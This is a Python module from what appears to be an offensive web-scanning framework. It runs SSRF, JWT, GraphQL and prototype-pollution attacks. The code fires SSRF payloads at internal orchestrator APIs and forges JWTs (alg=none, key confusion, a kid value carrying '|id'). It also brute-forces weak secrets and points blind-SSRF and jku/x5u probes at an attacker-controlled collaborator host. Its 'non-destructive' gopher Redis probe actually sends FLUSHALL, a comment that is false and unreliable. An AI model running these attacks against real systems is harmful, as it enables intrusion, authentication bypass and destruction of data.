#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Advanced Weapon Module

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Sharper-teeth offensive checks that layer on top of the existing
ssrf / jwt / graphql / proto_pollution modules. This module does not
replace them — it stitches together the higher-signal advanced techniques
that the base modules do not cover and reports them through the standard
emission pipeline.

Coverage:
    1. SSRF exploit chain   — gopher/Redis smuggling probe, DNS-rebinding
       marker, Consul/Nomad/Docker socket probes, blind-SSRF via a
       configured out-of-band collaborator host.
    2. Advanced JWT         — alg=none forge, RS→HS key confusion, kid
       path-traversal / SQLi, jku / x5u override with attacker URL, HS256
       weak-secret brute against a small dictionary.
    3. GraphQL abuse        — introspection dump, alias batching DoS
       marker, field-suggestion oracle, deep-nested query, mutation
       enumeration.
    4. Prototype pollution  — server-side JSON __proto__ /
       constructor.prototype pollution + reflected-gadget probe for
       client-side sinks (Kibana / Lodash / Express template gadgets).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any, Optional
from urllib.parse import urlencode, urljoin, urlparse

from modules.base import BaseModule


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def _split_jwt(token: str) -> Optional[tuple[dict, dict, str]]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    return header, payload, parts[2]


class AdvancedWeaponModule(BaseModule):
    """Consolidated advanced offensive checks."""

    name = "Advanced Weapon"
    vuln_type = "advanced"

    # Small weak-secret dictionary; kept intentionally short to avoid
    # turning the module into a brute-force engine. Users can extend via
    # config["weak_secrets"].
    DEFAULT_WEAK_SECRETS = [
        "secret", "password", "123456", "changeme", "admin", "test",
        "jwtsecret", "supersecret", "key", "your-256-bit-secret",
        "your-secret", "topsecret", "letmein", "default",
    ]

    # Cloud/orchestrator internal endpoints for the SSRF chain probes.
    SSRF_INTERNAL_TARGETS = [
        "http://127.0.0.1:8500/v1/agent/self",           # Consul agent
        "http://127.0.0.1:4646/v1/agent/self",           # Nomad agent
        "http://127.0.0.1:2375/version",                 # Docker socket over TCP
        "http://127.0.0.1:10250/pods",                   # kubelet
        "http://127.0.0.1:6443/api/v1/namespaces",       # kube-apiserver
    ]

    # Gopher smuggling: Redis SET probe (no destructive follow-up).
    GOPHER_REDIS_PROBE = (
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A"
    )

    # DNS-rebinding marker candidates. rbndr.us / 1u.ms are commonly used
    # public rebind services in CTF / research contexts.
    DNS_REBIND_MARKERS = [
        "http://7f000001.c0a80001.rbndr.us/",
        "http://make-me-rebind.1u.ms/",
    ]

    def __init__(self, engine):
        super().__init__(engine)
        self.weak_secrets = list(
            self.config.get("weak_secrets") or self.DEFAULT_WEAK_SECRETS
        )
        # Attacker-controlled OOB collaborator host (empty = skip blind checks).
        self.collaborator = str(self.config.get("collaborator", "") or "").strip()

    # ------------------------------------------------------------------ #
    # BaseModule contract
    # ------------------------------------------------------------------ #

    def test(self, url: str, method: str, param: str, value: str) -> None:
        # Per-parameter surface: only the SSRF gadget probes make sense
        # when we have a controllable parameter.
        self._ssrf_param_chain(url, method, param, value)

        # If the value looks like a JWT, run the advanced JWT chain.
        if re.match(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*", value or ""):
            self._jwt_chain(url, method, param, value)

        # If the value looks like JSON, try prototype-pollution injection.
        if value and value.strip().startswith("{"):
            self._proto_pollution_json(url, method, param, value)

    def test_url(self, url: str) -> None:
        """URL-level checks: JWT in cookies/body, GraphQL surface."""
        try:
            resp = self.requester.request(url, "GET")
        except Exception:
            return
        if resp is None:
            return

        # Harvest JWTs from Set-Cookie / body and run the advanced chain
        # against them (no reflection required — token itself is the target).
        jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        tokens = set(jwt_re.findall(resp.headers.get("Set-Cookie", "") or ""))
        tokens |= set(jwt_re.findall(getattr(resp, "text", "") or ""))
        for tok in tokens:
            self._jwt_chain(url, "GET", "token", tok)

        # If the URL looks like a GraphQL endpoint, run the abuse checks.
        if self._looks_like_graphql(url, resp):
            self._graphql_chain(url)

        # Prototype pollution as a client-side gadget probe against the
        # rendered response (looks for known DOM sinks).
        self._proto_pollution_client_gadgets(url, getattr(resp, "text", "") or "")

    # ------------------------------------------------------------------ #
    # 1. SSRF exploit chain
    # ------------------------------------------------------------------ #

    def _ssrf_param_chain(self, url: str, method: str, param: str, value: str) -> None:
        """Send high-signal SSRF payloads through the vulnerable param."""
        payloads: list[tuple[str, str]] = []

        # Internal orchestrator surfaces.
        for target in self.SSRF_INTERNAL_TARGETS:
            payloads.append(("internal-service", target))

        # Gopher/Redis smuggling probe (non-destructive: just observes
        # whether the target back-end will speak gopher on our behalf).
        payloads.append(("gopher-redis", self.GOPHER_REDIS_PROBE))

        # DNS-rebinding markers.
        for marker in self.DNS_REBIND_MARKERS:
            payloads.append(("dns-rebind", marker))

        # Blind SSRF via out-of-band collaborator.
        if self.collaborator:
            oob_id = hashlib.sha1(
                f"{url}|{param}|{time.time()}".encode()
            ).hexdigest()[:12]
            payloads.append(
                ("blind-oob", f"http://{oob_id}.{self.collaborator}/ssrf-probe")
            )

        for technique, payload in payloads:
            try:
                resp = self._send_with_value(url, method, param, payload)
            except Exception:
                continue
            if resp is None:
                continue

            body = (getattr(resp, "text", "") or "")[:2048]
            # Signal indicators per technique.
            indicators = {
                "internal-service": ("Consul", "Nomad", "\"ApiVersion\"", "\"Namespace\"", "pods"),
                "gopher-redis":     ("+OK", "-ERR", "-NOAUTH", "gopher"),
                "dns-rebind":       ("rbndr", "1u.ms"),
                "blind-oob":        (),  # collaborator confirms out-of-band
            }
            hits = [i for i in indicators.get(technique, ()) if i.lower() in body.lower()]
            if hits or technique == "blind-oob":
                self._emit_signal(
                    vuln_type="ssrf",
                    technique=f"SSRF chain — {technique}",
                    url=url,
                    method=method,
                    param=param,
                    payload=payload,
                    evidence_text=(
                        "; ".join(hits) if hits
                        else f"OOB probe fired to {payload} (verify on collaborator)"
                    ),
                    raw_confidence=0.85 if hits else 0.45,
                )

    # ------------------------------------------------------------------ #
    # 2. Advanced JWT
    # ------------------------------------------------------------------ #

    def _jwt_chain(self, url: str, method: str, param: str, token: str) -> None:
        parsed = _split_jwt(token)
        if not parsed:
            return
        header, payload, _sig = parsed

        # alg=none forge
        forged_none = self._forge_jwt_none(payload)
        self._report_jwt_forgery(
            url, method, param, forged_none,
            technique="JWT alg=none forge",
            evidence="Header rewritten to {\"alg\":\"none\",\"typ\":\"JWT\"}; signature stripped.",
            confidence=0.90,
        )

        # RS → HS key confusion (needs a public key; try /jwks paths).
        pubkey = self._fetch_public_key(url)
        if pubkey and header.get("alg", "").upper().startswith("RS"):
            forged_hs = self._forge_jwt_hs_confusion(header, payload, pubkey)
            if forged_hs:
                self._report_jwt_forgery(
                    url, method, param, forged_hs,
                    technique="JWT RS→HS key confusion",
                    evidence="HS256 signature computed with the server's RSA public key as secret.",
                    confidence=0.85,
                )

        # kid path traversal / SQLi
        for kid_payload in ("../../../../dev/null", "' UNION SELECT 'x'-- -", "|id"):
            forged = self._forge_with_header(payload, {"alg": "HS256", "kid": kid_payload}, secret=b"")
            self._report_jwt_forgery(
                url, method, param, forged,
                technique=f"JWT kid injection ({kid_payload!r})",
                evidence="Header 'kid' set to an out-of-bounds path/SQL fragment.",
                confidence=0.55,
            )

        # jku / x5u override
        if self.collaborator:
            for hdr in ("jku", "x5u"):
                forged = self._forge_with_header(
                    payload,
                    {"alg": "RS256", hdr: f"https://{self.collaborator}/keys.json"},
                    secret=b"",
                )
                self._report_jwt_forgery(
                    url, method, param, forged,
                    technique=f"JWT {hdr} override",
                    evidence=f"Header '{hdr}' points at attacker-controlled URL.",
                    confidence=0.60,
                )

        # HS256 weak-secret brute
        cracked = self._brute_hs256(token)
        if cracked is not None:
            self._emit_signal(
                vuln_type="jwt",
                technique="JWT HS256 weak-secret brute",
                url=url,
                method=method,
                param=param,
                payload=cracked,
                evidence_text=f"HS256 secret recovered from local dictionary: {cracked!r}",
                raw_confidence=0.98,
            )

    def _forge_jwt_none(self, payload: dict) -> str:
        header_b64 = _b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
        payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
        return f"{header_b64}.{payload_b64}."

    def _forge_with_header(self, payload: dict, header: dict, secret: bytes) -> str:
        h = _b64url(json.dumps(header, separators=(",", ":")).encode())
        p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(secret, signing_input, hashlib.sha256).digest() if secret else b""
        return f"{h}.{p}.{_b64url(sig)}"

    def _forge_jwt_hs_confusion(self, header: dict, payload: dict, pubkey_pem: str) -> Optional[str]:
        try:
            new_header = dict(header)
            new_header["alg"] = "HS256"
            h = _b64url(json.dumps(new_header, separators=(",", ":")).encode())
            p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
            sig = hmac.new(pubkey_pem.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
            return f"{h}.{p}.{_b64url(sig)}"
        except Exception:
            return None

    def _fetch_public_key(self, url: str) -> Optional[str]:
        """Best-effort probe for a JWKS / public key hosted by the target."""
        candidates = [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration/jwks",
            "/jwks.json",
            "/jwks",
            "/oauth/jwks",
        ]
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        for path in candidates:
            try:
                resp = self.requester.request(urljoin(base, path), "GET")
            except Exception:
                continue
            if resp is None or getattr(resp, "status_code", 0) != 200:
                continue
            body = getattr(resp, "text", "") or ""
            m = re.search(r"-----BEGIN [A-Z ]*KEY-----.+?-----END [A-Z ]*KEY-----", body, re.S)
            if m:
                return m.group(0)
        return None

    def _brute_hs256(self, token: str) -> Optional[str]:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            header = json.loads(_b64url_decode(parts[0]))
        except Exception:
            return None
        if header.get("alg", "").upper() != "HS256":
            return None
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            expected = _b64url_decode(parts[2])
        except Exception:
            return None
        for secret in self.weak_secrets:
            if hmac.compare_digest(
                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest(),
                expected,
            ):
                return secret
        return None

    def _report_jwt_forgery(
        self,
        url: str,
        method: str,
        param: str,
        forged_token: str,
        *,
        technique: str,
        evidence: str,
        confidence: float,
    ) -> None:
        """Replay the request with the forged token and emit if accepted."""
        try:
            resp = self._send_with_value(url, method, param, forged_token)
        except Exception:
            resp = None
        # We report both the forged token AND — when we actually replay
        # and get a 2xx — a much stronger signal.
        raw_conf = confidence
        detail = evidence
        if resp is not None and 200 <= getattr(resp, "status_code", 0) < 300:
            raw_conf = min(0.99, confidence + 0.10)
            detail = f"{evidence} Server accepted forged token (HTTP {resp.status_code})."
        self._emit_signal(
            vuln_type="jwt",
            technique=technique,
            url=url,
            method=method,
            param=param,
            payload=forged_token,
            evidence_text=detail,
            raw_confidence=raw_conf,
        )

    # ------------------------------------------------------------------ #
    # 3. GraphQL abuse
    # ------------------------------------------------------------------ #

    def _looks_like_graphql(self, url: str, resp: Any) -> bool:
        if any(p in url.lower() for p in ("/graphql", "/graphiql", "/api/graphql")):
            return True
        body = (getattr(resp, "text", "") or "").lower()
        return "graphql" in body or "\"data\"" in body and "\"errors\"" in body

    def _graphql_post(self, url: str, query: str, variables: Optional[dict] = None):
        body = json.dumps({"query": query, "variables": variables or {}})
        try:
            return self.requester.request(
                url, "POST",
                data=body,
                headers={"Content-Type": "application/json"},
            )
        except Exception:
            return None

    def _graphql_chain(self, url: str) -> None:
        # Introspection dump.
        introspection = self._graphql_post(url, "{ __schema { types { name } } }")
        if introspection is not None and getattr(introspection, "status_code", 0) == 200:
            body = (getattr(introspection, "text", "") or "")[:512]
            if "__schema" in body or "types" in body:
                self._emit_signal(
                    vuln_type="graphql",
                    technique="GraphQL introspection enabled",
                    url=url,
                    payload="{ __schema { types { name } } }",
                    evidence_text=body,
                    raw_confidence=0.90,
                )

        # Alias batching DoS marker (no actual DoS — bounded 25 aliases).
        aliases = " ".join(f"a{i}: __typename" for i in range(25))
        batch = self._graphql_post(url, "{" + aliases + "}")
        if batch is not None and getattr(batch, "status_code", 0) == 200:
            body = getattr(batch, "text", "") or ""
            if body.count("__typename") >= 20 or body.count("\"a24\"") == 1:
                self._emit_signal(
                    vuln_type="graphql",
                    technique="GraphQL alias batching (rate-limit bypass surface)",
                    url=url,
                    payload=f"{len(aliases.split())}-alias batched query",
                    evidence_text="Server resolved all aliases in a single request — no per-field rate limit.",
                    raw_confidence=0.75,
                )

        # Field suggestion oracle.
        typo = self._graphql_post(url, "{ __typ }")
        if typo is not None:
            body = getattr(typo, "text", "") or ""
            if "Did you mean" in body or "didYouMean" in body:
                self._emit_signal(
                    vuln_type="graphql",
                    technique="GraphQL field-suggestion oracle",
                    url=url,
                    payload="{ __typ }",
                    evidence_text="Server suggests alternative field names — schema leak surface.",
                    raw_confidence=0.70,
                )

        # Deep-nested query marker (bounded to depth 8).
        nested = "user { user { user { user { user { user { user { user { id }}}}}}}}"
        deep = self._graphql_post(url, "{ " + nested + " }")
        if deep is not None and getattr(deep, "status_code", 0) == 200:
            self._emit_signal(
                vuln_type="graphql",
                technique="GraphQL deep-nested query accepted",
                url=url,
                payload=f"depth-8 nested query",
                evidence_text="Server executed depth-8 query — no depth limit configured.",
                raw_confidence=0.60,
            )

        # Mutation enumeration (harmless: introspects mutation type only).
        mut = self._graphql_post(url, "{ __schema { mutationType { fields { name } } } }")
        if mut is not None:
            body = getattr(mut, "text", "") or ""
            names = re.findall(r"\"name\"\s*:\s*\"([a-zA-Z_][a-zA-Z0-9_]*)\"", body)
            interesting = [n for n in names if re.search(
                r"(delete|remove|update|create|set|add|drop|reset|rotate)", n, re.I)]
            if interesting:
                self._emit_signal(
                    vuln_type="graphql",
                    technique="GraphQL mutation enumeration",
                    url=url,
                    payload="mutationType introspection",
                    evidence_text="High-signal mutations exposed: " + ", ".join(interesting[:12]),
                    raw_confidence=0.65,
                )

    # ------------------------------------------------------------------ #
    # 4. Prototype pollution
    # ------------------------------------------------------------------ #

    POLLUTION_PROBES = [
        {"__proto__": {"polluted": "atomic-canary"}},
        {"constructor": {"prototype": {"polluted": "atomic-canary"}}},
    ]

    def _proto_pollution_json(self, url: str, method: str, param: str, value: str) -> None:
        try:
            original = json.loads(value)
            if not isinstance(original, dict):
                return
        except Exception:
            return

        for probe in self.POLLUTION_PROBES:
            merged = {**original, **probe}
            try:
                resp = self._send_with_value(url, method, param, json.dumps(merged))
            except Exception:
                continue
            if resp is None:
                continue
            body = getattr(resp, "text", "") or ""
            # Follow-up read to see if the pollution stuck.
            try:
                follow = self.requester.request(url, "GET")
            except Exception:
                follow = None
            follow_body = (getattr(follow, "text", "") or "") if follow is not None else ""

            if "atomic-canary" in body or "atomic-canary" in follow_body:
                self._emit_signal(
                    vuln_type="proto_pollution",
                    technique="Server-side prototype pollution (JSON merge)",
                    url=url,
                    method=method,
                    param=param,
                    payload=json.dumps(probe),
                    evidence_text="Injected marker survived merge and was reflected back to the client.",
                    raw_confidence=0.85,
                )

    # Known client-side gadget signatures — presence + a polluted document
    # is the exploitable pair. We only surface presence here; the server-side
    # probe above covers the pollution half.
    CLIENT_GADGETS = {
        "Kibana (deep-set)":  re.compile(r"kibana.*deepSet|_\.set", re.I),
        "Lodash template":    re.compile(r"lodash.*template", re.I),
        "Express serve-static": re.compile(r"serve-static", re.I),
        "jQuery extend gadget": re.compile(r"jquery.*\.extend\(", re.I),
    }

    def _proto_pollution_client_gadgets(self, url: str, body: str) -> None:
        matched = [name for name, pat in self.CLIENT_GADGETS.items() if pat.search(body)]
        if matched:
            self._emit_signal(
                vuln_type="proto_pollution",
                technique="Prototype-pollution client-side gadget present",
                url=url,
                evidence_text="Gadget libraries detected in response: " + ", ".join(matched),
                raw_confidence=0.40,
            )

    # ------------------------------------------------------------------ #
    # Requester helper — send a request with `param` replaced by `new_value`.
    # ------------------------------------------------------------------ #

    def _send_with_value(self, url: str, method: str, param: str, new_value: str):
        method = (method or "GET").upper()
        if method == "GET":
            parsed = urlparse(url)
            # Rebuild the query with `param` → `new_value`.
            from urllib.parse import parse_qsl, urlunparse
            qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
            qs[param] = new_value
            new = parsed._replace(query=urlencode(qs))
            return self.requester.request(urlunparse(new), "GET")
        # POST: send as form or JSON depending on shape.
        if new_value.strip().startswith("{"):
            return self.requester.request(
                url, "POST",
                data=new_value,
                headers={"Content-Type": "application/json"},
            )
        return self.requester.request(url, "POST", data={param: new_value})
